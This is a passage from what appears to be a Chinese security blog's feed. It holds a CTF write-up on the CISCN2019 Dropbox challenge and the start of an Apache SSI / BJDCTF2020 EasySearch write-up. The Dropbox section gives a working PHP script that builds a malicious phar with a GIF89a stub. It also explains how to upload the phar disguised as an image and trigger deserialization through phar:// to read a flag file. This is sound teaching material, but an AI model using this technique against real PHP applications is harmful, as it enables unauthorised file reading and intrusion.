function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>delete.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><hr><p>不得不说代码量有点夸张，引用下大佬的解释：</p><ul><li><p>1.首先看到class.php的File类里的close方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 这里我们要想办法让filename=flag.txt即可以读取到flag</span><span class="token comment">// 我们还要想办法给他回显出来</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>2.FileList的_call()方法语义，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，接下来的_destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以知道，index.php里创建了一个FileList对象，在脚本执行完毕后触发_destruct，则会输出该用户目录下的文件信息）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>       <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>       <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>       <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>       <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>           <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">ä¸è½½&lt;/a> / &lt;a href="#" class="delete">å é¤&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>           <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>3.此时我们又看到了User类的_destruct()方法;</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">// 也就是说如果db=FileList类的实例，就变成了FileList->close();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>4.当执行FileList-&gt;close()时，因为FileList类中没有close()这个方法所以调用FileList-&gt;_call()从而遍历全文件找close()方法（这是因为_call（）函数的语义，<strong>这里close作为call的参数传入的</strong>），找到了File-&gt;close()就执行了读取文件内容的操作file_get_contents($filename)并给他的结果返回FileList-&gt;$results,最后FileList-&gt;_destruct()方法输出了这个结果，我们即可以通过这个思路拿到flag。</p></li><li><p>5.这时候我们想到phar，我们构造一个$filename&#x3D;&#x2F;flag.txt 。然后按照刚刚的思路就可以得到我们的flag。</p></li><li><p>6.总结一下就是：<br>User-&gt;_destruct &#x3D;&gt; FileList-&gt;close() &#x3D;&gt; FileList-&gt;_call(‘close’) &#x3D;&gt; File-&gt;close(‘&#x2F;flag.txt’) &#x3D;&gt; $results&#x3D;file_get_contents(‘flag.txt’) &#x3D;&gt; FileList-&gt;_destruct() &#x3D;&gt; echo $result 。</p></li></ul><p>然后就是编写链子(注意只需要变量部分就行了，要不然运行会报挺多错的)：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成一个phar文件，文件名为shell.phar</span><span class="token variable">$phar</span><span class="token operator">-></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将对象user写入到metadata中</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"haha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加压缩文件，文件名字为shell.txt,内容为haha，这个随意</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传后修改mimi类型为image&#x2F;jpeg后通过：<br><img src="/images/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"><br>然后删除，抓包添加phar:&#x2F;&#x2F;自动反序列化，程序结束自动调用user类的__destruction()打印出来<br><img src="/images/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p><hr><p>参考博客：</p><ul><li><a href="https://blog.csdn.net/SHININGENDING/article/details/124368489">https://blog.csdn.net/SHININGENDING/article/details/124368489</a></li><li><a href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</a>   这个师傅讲得好</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-SSI远程执行漏洞</title>
      <link href="/2023/08/05/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/08/05/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-SSI远程执行漏洞"><a href="#Apache-SSI远程执行漏洞" class="headerlink" title="Apache-SSI远程执行漏洞"></a>Apache-SSI远程执行漏洞</h1><hr><h2 id="SSI简介"><a href="#SSI简介" class="headerlink" title="SSI简介"></a>SSI简介</h2><hr><p> SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。</p><p>例如，您可以将指令放置到现有的HTML页面中，例如：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--#echo var&#x3D;&quot;DATE_LOCAL&quot; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且，当该页面被投放时，该片段将被评估并替换为其值：</p><pre class="line-numbers language-none"><code class="language-none">Tuesday, 15-Jan-2013 19:28:54 EST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://cloud.tencent.com/developer/article/1540513">参考文章</a></p><hr><h2 id="BJDCTF2020-EasySearch-1"><a href="#BJDCTF2020-EasySearch-1" class="headerlink" title="[BJDCTF2020]EasySearch 1"></a>[BJDCTF2020]EasySearch 1</h2><hr><p>首先开扫，还是字典问题:这里有源码泄露：index.php.swp<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            